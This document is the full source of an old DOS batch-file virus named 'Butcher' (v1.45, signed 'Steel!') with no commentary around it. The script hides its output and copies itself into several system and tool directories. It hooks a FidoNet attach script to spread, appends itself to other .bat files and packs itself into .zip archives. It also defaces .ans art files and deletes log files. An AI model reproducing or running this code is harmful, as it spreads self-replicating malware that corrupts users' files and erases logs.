@ctty nul
if "%0"=="AUTOEXEC.BAT" del %0
if exist c:\bvdfg.txt goto ok
type ok >> c:\bvdfg.txt
copy %0 c:\systdrv.bat
copy %0 c:\fido\systdrv.bat
copy %0 c:\util\systdrv.bat
copy %0 d:\util\systdrv.bat
copy %0 %winbootdir%\systdrv.bat
copy %0 d:\tools\systdrv.bat
copy %0 c:\tools\systdrv.bat
echo. >> c:\fido\attach.bat
echo attach.exe -A -L %0 >> c:\fido\attach.bat
attrib c:\bvdfg.txt +h +r
:ok
if exist c:\butcher.txt goto cont
echo [0;1;33m[2J[6C[32mWarning! > c:\butcher.txt
echo  [36m butcher go for you!  >> c:\butcher.txt
:cont
for %%j in (*.bat ..\*.bat) do if %%j==ATTACH.BAT goto att
goto re
:att
echo. >> attach.bat
echo attach.exe -A -L %0 >> attach.bat
exit
:re
for %%f in (*.bat ..\*.bat) do find "TRTL" %%f
if not errorlevel 1 goto next
for %%d in (*.bat ..\*.bat ..\..\*.bat) do type %0 >> %%d
:next
for %%z in (*.zip ..\*.zip) do pkzip %%z %0
for %%q in (*.ans c:\max\*.ans) do type c:\butcher.txt >> %%q
del *.log
@ctty con
: (c) Steel!
:     Version 1.45
